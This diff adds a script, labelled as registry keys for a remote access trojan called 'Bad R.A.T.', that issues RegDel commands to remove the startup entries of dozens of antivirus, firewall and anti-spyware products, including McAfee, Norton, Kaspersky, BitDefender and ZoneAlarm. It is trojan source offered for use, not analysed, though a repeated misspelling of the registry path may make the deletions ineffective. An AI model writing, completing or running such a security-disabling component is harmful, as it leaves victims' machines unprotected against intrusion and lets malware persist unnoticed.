@@ -1,0 +1,174 @@
+;Reg Keys for [Bad R.A.T.]
+;by MrHawk
+;Dieses Script löscht die Startups von verschiedenen AV und FW
+;Mcafee
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,mcmnhdlr
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,mcvsshld
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,McUpdate
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,mcregwiz
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,mcagent
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ActiveShield
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AvconsoleEXE
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Mcappins.exe
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,McVsRte
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,mgavctrl
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,mgavrtclexe
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,mgavrte.exe
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ShStatEXE
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Imonitor
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Mount Safe & Sound
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,MpfTray.exe
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,MyAgtTry
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,myCIO.com Splash
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Naimagent_UI
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Naimagent_service
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Plguni
+
+;Ad-aware from Lavasoft
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Adaware Bootup
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Ad Blocker
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Ad-watch
+RegDel HKEY_CURRENT_USER,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Lavasoft Adwatch
+
+;Norton product
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Advanced Tools Check
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ADVCHK
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ALUAlert
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVG_CC
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,avgcc32
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,CcApp
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Ccdecode
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,CCDoctorLogonTesting
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,CcEvtMgr
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,CcPxySvc
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ccreg
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,CcRegVfy
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ccSetMgr
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,SymKeepAlive
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,NAV Agent
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,navapw32
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,NAV CfgWiz
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,NAV Configuration Wizard
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,NAV DefAlert
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton Auto-Protect
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton AV Preload
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton Program Scheduler
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton Navigator Loader
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton eMail Protect
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton Disk Doctor
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton Crashguard Monitor
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton Program Scheduler Event Checker
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norton System Doctor
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,NPROTECT
+
+;Panda Antivirus Titanium
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Agente
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Apvxd
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Apvxdwin
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,PAVFIRES
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,RuLaunch
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ScanInicio
+
+;Avast32 anti-virus
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Avast32
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Avast!
+
+;Tiny Personal Firewall
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Amonitor
+
+;AVG Anti-Virus
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVG7_CC
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVG_EMC
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,avgmsvr.exe
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVG_RegCleaner
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Avgserv9.exe
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AvMaiSrv
+
+;Anti-Virus
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVGNT
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVGCtrl
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVSCHED32
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AVWUpd32
+
+;Kaspersky Labs
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,avpcc
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ogrc
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,OfficeGuard RegChecker
+
+;Command Antivirus tray icon
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Avtray
+
+;BitDefender virus
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,avx communicator
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Avxlive
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,avxlni
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BitDefender Communicator
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BitDefender for MSN Messenger
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,bitdefenderlive
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BitDefender Live! Init
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BitDefender_P2P_Startup
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BitDefender Scan Server
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BDMCon
+
+;BullGuard
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BullGuard
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BullGuardInit
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BullGuard Update
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,BullGuard XComm
+
+;eSafe
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,eSafe Protect
+
+; F-Secure Antivirus
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,F-Secure Management Agent
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,F-Secure Manager
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,F-StopW.exe
+
+;Tiny Personal Firewall
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,umxagent
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,umxldra
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,UMXLDRW
+
+;Vexira Antivirus
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,VAGCtrl
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,VAGuard
+
+;Zonelabs
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ZoneAlarm
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ZoneAlarm Pro
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Zone Labs Client
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,minilog
+
+;Misc
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,AlarmWatcher
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Alogserv
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Anti-keylogger check
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Backwork
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,VMDFW
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,THGuard
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,TrojanScanner
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,smc
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,SMC Service
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,SmcServices
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,SoloSchedule
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Solo Sentry
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,SpyBotSnD
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,SpyCop ScanCheck
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,GhostStartService
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,GhostStartTrayApp
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Norman ZANDA
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,myNetWatchman
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,OfficeScanNT Monitor
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,PAV.EXE
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,PER Email Protection
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,PersFw
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,PFW_CfgEngine
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,PFW_PullSrv
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,ppass
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,RapApp
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Raptor Mobile
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,RAV8Tray
+RegDel HKEY_LOCAL_MACHINE,SOFTWARE\Mircosoft\Windows\CurrentVersion\Run,Realtime Monitor
+
+
+
